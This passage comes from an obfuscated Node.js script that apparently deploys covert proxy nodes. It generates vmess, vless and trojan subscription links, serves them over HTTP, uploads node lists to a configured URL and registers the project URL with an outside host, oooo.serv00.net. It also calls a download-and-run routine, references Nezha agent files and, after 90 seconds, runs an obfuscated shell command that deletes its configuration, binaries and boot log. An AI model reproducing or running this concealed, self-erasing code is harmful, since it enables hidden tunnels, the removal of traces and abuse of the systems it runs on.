extractDomains();}catch(_0x261960){console[_0x532255(0x1d7)](_0x532255(_0x11a175._0x2d32b7)+_0x261960);}}}catch(_0x46541f){console[_0x532255(0x1d7)](_0x532255(_0x11a175._0xeeef6),_0x46541f);}async function _0x121471(){const _0x415b17=_0x532255;try{const _0x1f93d0=await axios['get'](_0x415b17(0x21e),{'timeout':0xbb8});if(_0x1f93d0[_0x415b17(_0x31489e._0x1b4f94)]&&_0x1f93d0[_0x415b17(_0x31489e._0x1b4f94)][_0x415b17(_0x31489e._0x4d1af1)]&&_0x1f93d0[_0x415b17(0x1c2)][_0x415b17(_0x31489e._0x1915ca)])return _0x1f93d0[_0x415b17(_0x31489e._0x127807)]['country_code']+'_'+_0x1f93d0[_0x415b17(_0x31489e._0x42debb)][_0x415b17(0x251)];}catch(_0x8aca6c){try{const _0x4f3200=await axios[_0x415b17(0x1e4)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x4f3200[_0x415b17(0x1c2)]&&_0x4f3200['data']['status']==='success'&&_0x4f3200['data'][_0x415b17(0x1ea)]&&_0x4f3200[_0x415b17(_0x31489e._0x42fbc8)][_0x415b17(0x251)])return _0x4f3200[_0x415b17(_0x31489e._0x179378)]['countryCode']+'_'+_0x4f3200['data'][_0x415b17(_0x31489e._0x4378ac)];}catch(_0x19be14){}}return _0x415b17(0x229);}async function _0x19f099(_0x56c2d4){const _0x223384={_0x3234d2:0x19f,_0x539d6c:0x1d0,_0x52ccc5:0x258,_0x4dff99:0x1d9,_0x2c4a50:0x1e9,_0x27536c:0x24c,_0xaccbba:0x247,_0x2bed74:0x205},_0x4a0dc1=await _0x121471(),_0x51ccde=NAME?NAME+'-'+_0x4a0dc1:_0x4a0dc1;return new Promise(_0x4314a2=>{setTimeout(()=>{const _0x51b33f={_0x115419:0x1e6,_0x4d2495:0x1d9},_0x42b860=_0x3ff1,_0x8869dc={'v':'2','ps':''+_0x51ccde,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x42b860(0x232),'net':'ws','type':_0x42b860(0x232),'host':_0x56c2d4,'path':_0x42b860(_0x223384._0x3234d2),'tls':_0x42b860(0x1b3),'sni':_0x56c2d4,'alpn':'','fp':_0x42b860(_0x223384._0x539d6c)},_0x2ff02d=_0x42b860(0x1fd)+UUID+'@'+CFIP+':'+CFPORT+_0x42b860(_0x223384._0x52ccc5)+_0x56c2d4+'&fp=firefox&type=ws&host='+_0x56c2d4+_0x42b860(0x1bf)+_0x51ccde+_0x42b860(0x23d)+Buffer[_0x42b860(0x1e6)](JSON['stringify'](_0x8869dc))[_0x42b860(0x1ba)](_0x42b860(_0x223384._0x4dff99))+_0x42b860(0x213)+UUID+'@'+CFIP+':'+CFPORT+_0x42b860(_0x223384._0x2c4a50)+_0x56c2d4+_0x42b860(0x1c6)+_0x56c2d4+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x51ccde+_0x42b860(_0x223384._0x27536c);console[_0x42b860(_0x223384._0xaccbba)](Buffer['from'](_0x2ff02d)['toString'](_0x42b860(0x1d9))),fs[_0x42b860(0x1d6)](subPath,Buffer[_0x42b860(0x1e6)](_0x2ff02d)[_0x42b860(0x1ba)](_0x42b860(_0x223384._0x4dff99))),console['log'](FILE_PATH+_0x42b860(_0x223384._0x2bed74)),uploadNodes(),app[_0x42b860(0x1e4)]('/'+SUB_PATH,(_0x2434e9,_0x443947)=>{const _0x209a01=_0x42b860,_0xb84c4a=Buffer[_0x209a01(_0x51b33f._0x115419)](_0x2ff02d)['toString'](_0x209a01(_0x51b33f._0x4d2495));_0x443947[_0x209a01(0x22c)](_0x209a01(0x261),_0x209a01(0x1f5)),_0x443947['send'](_0xb84c4a);}),_0x4314a2(_0x2ff02d);},0x7d0);});}}async function uploadNodes(){const _0x4f0cb0={_0x3dd552:0x20d,_0x2636d9:0x267,_0x211bc8:0x247,_0x528c24:0x218,_0x4a9f94:0x212,_0x223865:0x204,_0x306bb7:0x227,_0x52ee12:0x1b6,_0x2c8a31:0x219,_0x50afc9:0x1c5,_0x4142a4:0x264},_0x128d71=_0x2a50c9;if(UPLOAD_URL&&PROJECT_URL){const _0x4e0caf=PROJECT_URL+'/'+SUB_PATH,_0x2559be={'subscription':[_0x4e0caf]};try{const _0x865b37=await axios[_0x128d71(_0x4f0cb0._0x3dd552)](UPLOAD_URL+_0x128d71(_0x4f0cb0._0x2636d9),_0x2559be,{'headers':{'Content-Type':_0x128d71(0x243)}});return _0x865b37&&_0x865b37[_0x128d71(0x1c5)]===0xc8?(console[_0x128d71(_0x4f0cb0._0x211bc8)](_0x128d71(_0x4f0cb0._0x528c24)),_0x865b37):null;}catch(_0x354278){if(_0x354278[_0x128d71(0x1d4)]){if(_0x354278[_0x128d71(0x1d4)][_0x128d71(0x1c5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x128d71(_0x4f0cb0._0x4a9f94)](listPath))return;const _0x13fd51=fs['readFileSync'](listPath,_0x128d71(_0x4f0cb0._0x223865)),_0x4ecf6c=_0x13fd51[_0x128d71(_0x4f0cb0._0x306bb7)]('\x0a')['filter'](_0xdb517a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x128d71(0x201)](_0xdb517a));if(_0x4ecf6c[_0x128d71(_0x4f0cb0._0x52ee12)]===0x0)return;const _0x21391d=JSON[_0x128d71(_0x4f0cb0._0x2c8a31)]({'nodes':_0x4ecf6c});try{const _0x13e751=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x21391d,{'headers':{'Content-Type':_0x128d71(0x243)}});return _0x13e751&&_0x13e751[_0x128d71(_0x4f0cb0._0x50afc9)]===0xc8?(console[_0x128d71(0x247)](_0x128d71(_0x4f0cb0._0x4142a4)),_0x13e751):null;}catch(_0x10c978){return null;}}else return;}}function cleanFiles(){const _0x14f402={_0x3b5721:0x220,_0x448a62:0x24f,_0xec9b6c:0x1c9,_0x411927:0x1ab},_0x2c58cb={_0xd2ec78:0x23a,_0x3256ed:0x247};setTimeout(()=>{const _0x3d1d42={_0x4d5a3d:0x1ae},_0x2be016=_0x3ff1,_0x53f19b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x53f19b[_0x2be016(0x220)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x53f19b[_0x2be016(_0x14f402._0x3b5721)](phpPath);process[_0x2be016(0x1bd)]===_0x2be016(_0x14f402._0x448a62)?exec(_0x2be016(0x246)+_0x53f19b[_0x2be016(_0x14f402._0xec9b6c)]('\x20')+_0x2be016(_0x14f402._0x411927),_0x36633a=>{const _0xc99c09=_0x2be016;console[_0xc99c09(0x1b9)](),console[_0xc99c09(0x247)](_0xc99c09(0x23a)),console[_0xc99c09(0x247)](_0xc99c09(_0x3d1d42._0x4d5a3d));}):exec(_0x2be016(0x20a)+_0x53f19b[_0x2be016(0x1c9)]('\x20')+'\x20>/dev/null\x202>&1',_0x5636f1=>{const _0x10057e=_0x2be016;console[_0x10057e(0x1b9)](),console[_0x10057e(0x247)](_0x10057e(_0x2c58cb._0xd2ec78)),console[_0x10057e(_0x2c58cb._0x3256ed)](_0x10057e(0x1ae));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x45ba94={_0xa6d069:0x243,_0x3b4f5e:0x247,_0x31da06:0x21a},_0x453923=_0x2a50c9;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x453923(0x247)](_0x453923(0x1dc));return;}try{const _0x4d8a8d=await axios[_0x453923(0x20d)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x453923(_0x45ba94._0xa6d069)}});return console[_0x453923(_0x45ba94._0x3b4f5e)](_0x453923(_0x45ba94._0x31da06)),_0x4d8a8d;}catch(_0x3252e9){return console[_0x453923(0x1d7)](_0x453923(0x231)+_0x3252e9[_0x453923(0x1cd)]),null;}}async function startserver(){const _0xee678f={_0x38d67c:0x1d7},_0x56bfe1=_0x2a50c9;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3141a3){console[_0x56bfe1(_0xee678f._0x38d67c)](_0x56bfe1(0x1db),_0x3141a3);}}startserver()[_0x2a50c9(0x1ac)](_0x2bf95e=>{const _0x4fdffc=_0x2a50c9;console[_0x4fdffc(0x1d7)](_0x4fdffc(0x1a8),_0x2bf95e);}),app[_0x2a50c9(0x1e3)](PORT,()=>console[_0x2a50c9(0x247)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
